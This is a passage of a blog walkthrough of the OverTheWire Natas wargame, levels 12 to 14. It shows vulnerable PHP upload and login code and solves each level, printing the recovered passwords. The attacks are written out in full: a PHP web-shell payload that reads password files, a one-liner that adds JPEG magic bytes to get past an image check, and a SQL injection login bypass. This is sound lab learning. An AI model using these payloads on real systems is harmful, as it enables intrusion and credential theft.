<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;uploadedfile&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Upload File&#34;</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="cp">&lt;? } ?&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>One of the first interesting to notice, is it looks like <code>$_POST[&quot;filename&quot;]</code> reads from the input field <code>filename</code>. Looking that over it seems to encode a random string and <strong>ALWAYS</strong> appends the <code>.jpg</code> file extension to the end of it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;filename&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;? print genRandomString(); ?&gt;.jpg&#34;</span> <span class="p">/&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>In the code from the server this function is used to determine a new random name, regardless of what the original upload name was:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$target_path = makeRandomPathFromFilename(&#34;upload&#34;, $_POST[&#34;filename&#34;]);
</code></pre></td></tr></table>
</div>
</div><p>The trick with this challenge lies here:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
</code></pre></td></tr></table>
</div>
</div><p>So the file extension is always tied to the <code>$_POST[&quot;filename&quot;]</code>, if we can change what the file ending is for the <code>POST</code>, it should be possible to upload any arbitrary file.</p>
<p>The end goal here is to upload a simple php script to execute a command to read the password for <code>natas13</code>. The payload we need to create php file with the following contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat /etc/natas_webpass/natas13&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Back in the browser, use the inspector to change the hardcoded file extension to <code>php</code>. After that upload the php payload and recieve a link to execute the php script.</p>
<p>Doing so reveals the password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</code></pre></td></tr></table>
</div>
</div><h2 id="natas13">natas13</h2>
<p>Starting this off by going to: <a href="http://natas13.natas.labs.overthewire.org/">http://natas13.natas.labs.overthewire.org/</a></p>
<p>Login info is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas13
Pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</code></pre></td></tr></table>
</div>
</div><p>This challenge is just like <a href="#natas12" rel="">natas12</a>, except this time around there&rsquo;s better security:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">if(array_key_exists(&#34;filename&#34;, $_POST)) {
    $target_path = makeRandomPathFromFilename(&#34;upload&#34;, $_POST[&#34;filename&#34;]);

    $err=$_FILES[&#39;uploadedfile&#39;][&#39;error&#39;];
    if($err){
        if($err === 2){
            echo &#34;The uploaded file exceeds MAX_FILE_SIZE&#34;;
        } else{
            echo &#34;Something went wrong :/&#34;;
        }
    } else if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
        echo &#34;File is too big&#34;;
    } else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {
        echo &#34;File is not an image&#34;;
    } else {
        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
            echo &#34;The file <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">\&#34;$target_path\&#34;</span><span class="p">&gt;</span>$target_path<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> has been uploaded&#34;;
        } else{
            echo &#34;There was an error uploading the file, please try again!&#34;;
        }
    }
}
</code></pre></td></tr></table>
</div>
</div><p>This time around there&rsquo;s an explicit check on the <code>exif_imagetype</code>. Looking up the documentation <a href="https://www.php.net/manual/en/function.exif-imagetype.php" target="_blank" rel="noopener noreffer">exif_imagetype</a>:</p>
<blockquote>
<p><code>exif_imagetype()</code> reads the first bytes of an image and checks its signature.</p>
</blockquote>
<p>In order to still have our code get executed, the same sort of exploit as last time can be used, <strong>except</strong> the php payload that is uploaded needs to have a few bytes added to the beginning to bypass this <code>exif_imagetype</code> filter.</p>
<p>On linux there a <a href="https://en.wikipedia.org/wiki/Hex_dump" target="_blank" rel="noopener noreffer">hex dumping</a> tool called <code>xxd</code> that can be used to look at a real <code>jpg</code>. By looking the raw bytes of the <code>jpg</code> we can figure out what the first few bytes are that would be checked by <code>exif_imagetype</code>. Most files have some sort of identifying header information that applications use to know how to parse it. Wiki has good details about <a href="https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format" target="_blank" rel="noopener noreffer">JPEG File Interchange Format</a>.</p>
<p>In the case of a <code>jpg</code> the contents look like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">00000000</span><span class="o">:</span> <span class="n">ffd8</span> <span class="n">ffe0</span>
</code></pre></td></tr></table>
</div>
</div><p>So all that&rsquo;s left is to insert these bytes at the start of the php payload, a quick one line python script should do the trick:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &#34;</span><span class="se">\xff\xd8\xff\xe0</span><span class="s1">&#34; + &#34;</span><span class="se">\n</span><span class="s1">&lt;? system(</span><span class="se">\&#34;</span><span class="s1">cat /etc/natas_webpass/natas14</span><span class="se">\&#34;</span><span class="s1">); ?&gt;&#34;&#39;</span> <span class="o">&gt;</span> <span class="n">getpass</span><span class="o">.</span><span class="n">php</span>
</code></pre></td></tr></table>
</div>
</div><p>Following the same process as last time with our new and improved php file as we did in <code>natas12</code>, results the password of:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
</code></pre></td></tr></table>
</div>
</div><h2 id="natas14">natas14</h2>
<p>Starting this off by going to: &laquo;<a href="http://natas14.natas.labs.overthewire.org/%3E">http://natas14.natas.labs.overthewire.org/&gt;</a></p>
<p>Login info is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas14
Pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
</code></pre></td></tr></table>
</div>
</div><p>With JPG upload bypasses covered, it&rsquo;s time to move onto username and password login bypasses that are validated via <a href="https://en.wikipedia.org/wiki/SQL" target="_blank" rel="noopener noreffer">SQL</a> queries. Presented with a form asking for Username and Password, and a button for viewing source:</p>
<p>The source shows the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="cp">&lt;?
</span><span class="cp">if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
</span><span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&lt;censored&gt;&#39;);
</span><span class="cp">    mysql_select_db(&#39;natas14&#39;, $link);
</span><span class="cp">
</span><span class="cp">    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34; and password=\&#34;&#34;.$_REQUEST[&#34;password&#34;].&#34;\&#34;&#34;;
</span><span class="cp">    if(array_key_exists(&#34;debug&#34;, $_GET)) {
</span><span class="cp">        echo &#34;Executing query: $query&lt;br&gt;&#34;;
</span><span class="cp">    }
</span><span class="cp">
</span><span class="cp">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
</span><span class="cp">            echo &#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;;
</span><span class="cp">    } else {
</span><span class="cp">            echo &#34;Access denied!&lt;br&gt;&#34;;
</span><span class="cp">    }
</span><span class="cp">    mysql_close($link);
</span><span class="cp">} else {
</span><span class="cp">?&gt;</span>

<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Login&#34;</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="cp">&lt;? } ?&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Based on the source it seems there&rsquo;s a debug option to print out the query that was executed to check to see if the username and password is valid. We can abuse this with the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">http://natas14.natas.labs.overthewire.org/index.php?username=a<span class="err">&amp;</span>password=a<span class="err">&amp;</span>debug
</code></pre></td></tr></table>
</div>
</div><p>Which gives us the following output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">Executing</span> <span class="n">query</span><span class="p">:</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;a&#34;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;a&#34;</span>
<span class="k">Access</span> <span class="n">denied</span><span class="o">!</span>
</code></pre></td></tr></table>
</div>
</div><p>The interesting thing here is that the query doesn&rsquo;t seem to be well guarded against improperly formatted input which opens the door to <a href="https://en.wikipedia.org/wiki/SQL_injection" target="_blank" rel="noopener noreffer">sql injection</a> attacks.</p>
<p>Ultimately the code is just checking that the result from the query is greater than 1:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
</code></pre></td></tr></table>
</div>
</div><p>The trick here will be to always get a positive value out of the query, regardless if the username and password are actually valid. Given the lack of checking against the characters provided, it should be possible to abuse the input and have the sql query ignore the username and password and evaluate any condition provided, in this case using an <code>OR</code> with an always true statement.</p>
<p>In practice this means that the input needed is: <code>&quot; or &quot;a&quot;=&quot;a</code>. The first <code>&quot;</code> closes off the opening quotation mark allowing for the <code>OR</code> to be evaluated as an SQL statement. That statement is <code>&quot;a&quot;=&quot;a</code>, which is always true. One thing to notice is that there is not final <code>&quot;</code>, that is because the original sql statement would normally have included that had we not closed it early.</p>
<p>In practice this looks like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql">    <span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="k">or</span> <span class="s2">&#34;a&#34;</span><span class="o">=</span><span class="s2">&#34;a&#34;</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="k">or</span> <span class="s2">&#34;a&#34;</span><span class="o">=</span><span class="s2">&#34;a&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>And here we have the password for the next level:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">    Successful login! The password <span class="k">for</span> natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2020-06-21&nbsp;<i class="fas fa-hashtag fa-fw"></i>f3dad5f</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/natas_challenges_part2/" data-title="Natas Challenges (part 2)" data-hashtags="OTW,natas,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/natas_challenges_part2/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/natas/">natas</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/natas_challenges_part1/" class="prev" rel="prev" title="Natas Challenges (part 1)"><i class="fas fa-angle-left fa-fw"></i>Natas Challenges (part 1)</a>
            <a href="/plex_aac_atfv_fix/" class="next" rel="next" title="Fixing AAC Playback with Amazon FireTV (Gen1)">Fixing AAC Playback with Amazon FireTV (Gen1)<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":300},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
</body>
</html>
